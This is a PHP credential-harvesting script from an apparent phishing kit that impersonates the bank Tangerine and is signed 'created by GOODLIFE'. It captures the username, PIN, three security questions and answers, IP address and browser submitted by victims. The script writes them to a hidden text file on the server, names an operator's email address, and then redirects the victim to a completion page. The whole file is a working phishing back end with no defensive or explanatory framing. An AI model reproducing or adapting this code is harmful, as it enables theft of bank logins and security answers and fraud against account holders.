 <?php

error_reporting(0);
$send = "medahnabil@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginResults---------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "pin : ".$_POST['pin']."\n";
$message .= "-----------------2 QuestionsResults-----------------\n";
$message .= "question : ".$_POST['question1']."\n";
$message .= "answer : ".$_POST['answer1']."\n";
$message .= "question : ".$_POST['question2']."\n";
$message .= "answer : ".$_POST['answer2']."\n";
$message .= "question : ".$_POST['question3']."\n";
$message .= "answer : ".$_POST['answer3']."\n";
$message .= "-----------------created by GOODLIFE-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TangerineResults-------------------\n";

$subject = "Tangerine - created by GOODLIFE ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"Tangerine - GOODLIFE" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

?>
<script>
    window.top.location.href = "complete.php";

</script>